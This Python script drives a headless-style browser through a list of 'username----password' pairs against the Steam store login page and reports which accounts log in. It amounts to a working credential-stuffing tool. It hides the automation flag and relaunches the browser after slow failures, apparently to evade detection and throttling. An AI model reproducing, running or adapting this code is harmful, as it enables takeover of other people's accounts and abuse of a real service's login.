import asyncio
import time
from pyppeteer import launch
from pyvirtualdisplay import Display
import nest_asyncio
import sys
import logging

nest_asyncio.apply()


async def amLogin(url, fileName):
    display = Display(visible=0, size=(800, 800))
    display.start()
    browser = await launch(
        options={
            'headless': False,
            'ignoreDefaultArgs': ['--enable-automation'],
            'args': ['--no-sandbox', '--disable-gpu'],
        })
    context = await browser.createIncognitoBrowserContext()
    page = await context.newPage()
    file = open(fileName)
    line = file.readline()  # 调用文件的 readline()方法
    if line == None:
        return
    while line:
        strlist = line.split('----')
        username = strlist[0]
        password = strlist[1].split('\n')[0]

        start = time.perf_counter()
        res = 1
        try:
            res = await test(page, username, password, url)
        except Exception as e:
            print("error", username, password)
        end = time.perf_counter()
        yongshi = end - start
        print("total==============", yongshi)
        if (res == 2 and (yongshi > 4)):
            try:
                await page.close()
                await context.close()
                await browser.close()
            except:
                print("reInit failed")
            browser = await launch(
                options={
                    'headless': False,
                    'ignoreDefaultArgs': ['--enable-automation'],
                    'args': ['--no-sandbox', '--disable-gpu'],
                    'dumpio': True
                })
            context = await browser.createIncognitoBrowserContext()
            page = await context.newPage()
        line = file.readline()


async def test(page, username, password, url):
    await page.goto(url, {'waitUntil': 'domcontentloaded'})
    time.sleep(0.5)
    await page.type('#input_username', username)

    await page.type('#input_password', password)

    await page.click('.login_btn')
    await page.waitForNavigation()
    element = await page.querySelector("#error_display")
    if element != None:
        print("错误", username, "----", password)
        return 2
    element = await page.querySelector("#newmodal")
    if element != None:
        print("success", username, "----", password)
        return 2
    print("错误", username, "----", password)
    return 3


if __name__ == '__main__':
    file = sys.argv[1]
    url = "https://store.steampowered.com/login/?redir=&redir_ssl=1&snr=1_4_661__global-header"
    loop = asyncio.get_event_loop()
    loop.run_until_complete(amLogin(url, file))
